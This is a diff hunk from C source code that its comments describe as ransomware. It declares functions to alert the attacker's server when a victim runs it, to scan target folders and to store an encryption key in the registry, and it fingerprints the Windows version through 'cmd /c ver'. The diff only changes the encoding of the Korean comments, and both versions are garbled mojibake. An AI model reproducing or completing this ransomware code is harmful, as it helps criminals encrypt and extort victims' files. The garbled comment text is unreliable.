@@ -57,10 +57,10 @@ typedef struct TargetFolders {
 
 TargetFolders targetFolders;
 
-int notifyToServer();            // Å¬¶óÀÌ¾ğÆ®°¡ ·£¼¶¿ş¾î¸¦ ½ÇÇà½ÃÄ×´Ù´Â °É °ø°İÀÚ¿¡°Ô ¾Ë¸²
-void makeFolderPath();            // Å¸°ÙÀ¸·Î ÁöÁ¤µÈ Æú´õµé °æ·Î »ı¼º
-int readTargetFolder(int, char*);   // Å¸°ÙÀ¸·Î ÁöÁ¤µÈ Æú´õµé Å½»öÇÏ±â
-int registerKeyToRegistry();      // ¾ÏÈ£È­ Å° ·¹Áö½ºÆ®¸®¿¡ µî·Ï
+int notifyToServer();            // í´ë¼ì´ì–¸íŠ¸ê°€ ëœì„¬ì›¨ì–´ë¥¼ ì‹¤í–‰ì‹œì¼°ë‹¤ëŠ” ê±¸ ê³µê²©ìì—ê²Œ ì•Œë¦¼
+void makeFolderPath();            // íƒ€ê²Ÿìœ¼ë¡œ ì§€ì •ëœ í´ë”ë“¤ ê²½ë¡œ ìƒì„±
+int readTargetFolder(int, char*);   // íƒ€ê²Ÿìœ¼ë¡œ ì§€ì •ëœ í´ë”ë“¤ íƒìƒ‰í•˜ê¸°
+int registerKeyToRegistry();      // ì•”í˜¸í™” í‚¤ ë ˆì§€ìŠ¤íŠ¸ë¦¬ì— ë“±ë¡
 const char* getFileType(const char* filepath);
 void countExtensions();
 
@@ -73,7 +73,7 @@ const char* GetOSName(DWORD dwMajor, DWORD dwMino) {
     char get_osName[1024];
     char Window_version[1024];
 
-    //cmd¿¡¼­ ¹öÀüÁ¤º¸ ±Ü¾î¿À´Â ÄÚµå
+    //cmdì—ì„œ ë²„ì „ì •ë³´ ê¸ì–´ì˜¤ëŠ” ì½”ë“œ
     FILE* fp = _popen("cmd /c ver", "r");
 
     fgetc(fp);
@@ -81,7 +81,7 @@ const char* GetOSName(DWORD dwMajor, DWORD dwMino) {
     //printf("version : %s\n", Window_version);
     fclose(fp);
 
-    //±Ü¾î¿Â ¹öÀüÁ¤º¸¿¡¼­ 10,11±¸ºĞÀ§ÇØ buildnumberÂÊ¸¸ ÃßÃâÇÏ´Â ºÎºĞ
+    //ê¸ì–´ì˜¨ ë²„ì „ì •ë³´ì—ì„œ 10,11êµ¬ë¶„ìœ„í•´ buildnumberìª½ë§Œ ì¶”ì¶œí•˜ëŠ” ë¶€ë¶„
     result = strtok(Window_version, "\.");
 
     while (result != NULL)
@@ -106,7 +106,7 @@ const char* GetOSName(DWORD dwMajor, DWORD dwMino) {
            osv.dwMinorVersion, osv.dwBuildNumber);
      }      
      */
-    //¹öÀü ±¸ºĞÇÏ´Â ÄÚµå
+    //ë²„ì „ êµ¬ë¶„í•˜ëŠ” ì½”ë“œ
     if ((dwMajor == 4) && (dwMino == 0)) return "WIN_95";
     else if ((dwMajor == 4) && (dwMino == 10)) return "WIN_98";
     else if ((dwMajor == 4) && (dwMino == 90)) return "WIN_ME";
@@ -164,16 +164,16 @@ int main()
     char* result;
     char Window_version[1024];
 
-    //cmd¿¡¼­ ¹öÀüÁ¤º¸ ±Ü¾î¿À´Â ÄÚµå
+    //cmdì—ì„œ ë²„ì „ì •ë³´ ê¸ì–´ì˜¤ëŠ” ì½”ë“œ
     FILE* fp = _popen("cmd /c ver", "r");
 
 
     fgetc(fp);
     fgets(Window_version, 1024, fp);
-    //printf("version : %s\n", Window_version);   //<<<<<<<<<<<<<<<<<<versionÀüÃ¼È®ÀÎ¿øÇÒ½ÃÁÖ¼®Á¦°Å
+    //printf("version : %s\n", Window_version);   //<<<<<<<<<<<<<<<<<<versionì „ì²´í™•ì¸ì›í• ì‹œì£¼ì„ì œê±°
     fclose(fp);
 
-    //±Ü¾î¿Â ¹öÀüÁ¤º¸¿¡¼­ 10,11±¸ºĞÀ§ÇØ buildnumberÂÊ¸¸ ÃßÃâÇÏ´Â ºÎºĞ
+    //ê¸ì–´ì˜¨ ë²„ì „ì •ë³´ì—ì„œ 10,11êµ¬ë¶„ìœ„í•´ buildnumberìª½ë§Œ ì¶”ì¶œí•˜ëŠ” ë¶€ë¶„
     result = strtok(Window_version, "\.");
 
     while (result != NULL)
